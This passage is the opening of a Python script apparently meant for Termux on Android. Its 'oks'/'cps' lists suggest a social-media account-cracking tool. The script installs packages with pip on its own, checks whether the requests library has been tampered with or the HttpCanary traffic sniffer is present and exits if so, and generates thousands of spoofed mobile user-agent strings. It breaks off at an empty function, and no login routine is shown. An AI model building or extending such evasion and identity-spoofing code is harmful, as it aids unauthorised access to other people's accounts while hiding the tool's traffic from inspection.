import os
import re
import time
import uuid
import hashlib
import random
import string
import subprocess
import requests
import secrets
import sys
import json,urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
# ➤ Color
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
BLACK = '033[1;30m'
CYN = "\033[0;106m"
orang = '\033[38;2;255;165;0m'
my_color = [X,rad,G,Y,PP,RR,GS,W]
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f"pip install {module}")
def linex():
    print(f"    {W}--------------------------------------------")
def clear():
    os.system("clear")
sdcard_permission = '/storage/emulated/0';rm_permission = '/data/data/com.termux/files/usr/bin/rm';pkg_permission = '/data/data/com.termux/files/usr/bin/pkg';pip_permission = '/data/data/com.termux/files/usr/bin/pip';pip3_permission = '/data/data/com.termux/files/usr/bin/pip3'
def trigger_shutdown():
    print("Congratulations!")
    linex()
    sys.exit(1)
def read_file_safe(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except Exception:
        return ""
def security_checks():
    suspicious_words = ["print", "lambda", "zlib.decompress"]
    try:
        import requests
        req_path = getattr(requests, "__file__", None)
        if req_path:
            req_dir = os.path.dirname(req_path)
            candidates = [
                os.path.join(req_dir, "api.py"),
                os.path.join(req_dir, "models.py"),
                os.path.join(req_dir, "sessions.py"),
            ]
        else:
            candidates = []
    except Exception:
        candidates = []
    extra_modules = []
    for mod_name in ("api", "models", "sessions"):
        try:
            mod = __import__(mod_name)
            mod_file = getattr(mod, "__file__", None)
            if mod_file:
                extra_modules.append(mod_file)
        except Exception:
            pass
    files_to_check = list(dict.fromkeys(candidates + extra_modules))
    for path in files_to_check:
        body = read_file_safe(path)
        if not body:
            continue
        for word in suspicious_words:
            if word in body:
                trigger_shutdown()
    termux_requests_paths = [
        "/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py",
        "/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py",
        "/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py"
    ]
    for path in termux_requests_paths:
        if os.path.exists(path):
            body = read_file_safe(path)
            if "print" in body:
                trigger_shutdown()
    httpcanary_paths = [
        "/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png",
        "/storage/emulated/0/Android/data/com.guoshi.httpcanary"
    ]
    for path in httpcanary_paths:
        if os.path.exists(path):
            trigger_shutdown()

simx = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', f''' \033[1;37m•\x1b[38;5;118m ''')      
sys.stdout.write('\x1b[1;37m\x1b]2; TEAM-GS-71\x07')
# ➤ Global Vars
loop = 0
oks = []
cps = []
nov = []
plist = []
password = []
method = []
xlxx = []
user = []
ugen = []
#--------------------------------->> API-UA <<---------------------------------#
for xd in range(1000):
   rr = random.randint; rc = random.choice
   aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
   lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
   build_nokiax = ['JDQ39','JZO54K']
   samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ","G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B","S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
   gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
   oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
   redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
   realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
   infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
   strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
   strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"  
   strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; Infinix {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   ugen.append(strvoppo)
   ugen.append(strvredmi)
   ugen.append(strvoppo1)
   ugen.append(strvinfinix)
   ugen.append(strvsamsung)
   ugen.append(strvredmi1)
   ugen.append(strvnokiax)
   ugen.append(strvgt)
for xd in range(10000):
    rr = random.randint
    build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
    bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
    oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
    infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
    redmi = random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
    um2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {oppo} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {redmi} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36"
    ugen.append(um2)
    ugen.append(um3)
    ugen.append(um1)
    ugen.append(um4)

def __UPD__():
